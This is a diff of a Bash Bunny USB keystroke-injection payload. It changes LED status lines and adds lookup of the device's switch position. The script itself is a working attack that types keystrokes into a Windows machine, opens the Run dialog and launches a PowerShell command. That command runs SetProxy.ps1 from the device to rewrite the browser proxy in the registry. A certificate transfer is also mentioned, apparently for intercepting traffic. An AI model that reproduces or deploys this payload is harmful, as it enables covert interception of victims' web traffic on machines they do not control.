@@ -19,10 +19,12 @@ LED R 50
 #Set ATTACKMODE to HID and Storage to be able to transfer the certificate
 ATTACKMODE HID STORAGE
 
-#Import Bunny Helpers
-source bunny_helpers.sh
 
-#Start of Script 
+LED SETUP
+GET SWITCH_POSITION
+
+LED ATTACK
+#Start of Script
 Q DELAY 6000
 Q GUI r
 Q DELAY 100
@@ -39,6 +41,7 @@ Q STRING cd \$absPath
 Q ENTER
 Q DELAY 500
 
+LED ATTACK
 #Set the proxy in the internet settings in the registry (For IE and Chrome).
 Q STRING powershell -ExecutionPolicy RemoteSigned ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\SetProxy.ps1')"
 Q ENTER
@@ -62,4 +65,4 @@ Q DELAY 500
 Q STRING EXIT
 Q ENTER
 sync
-LED R B 100
+LED FINISH
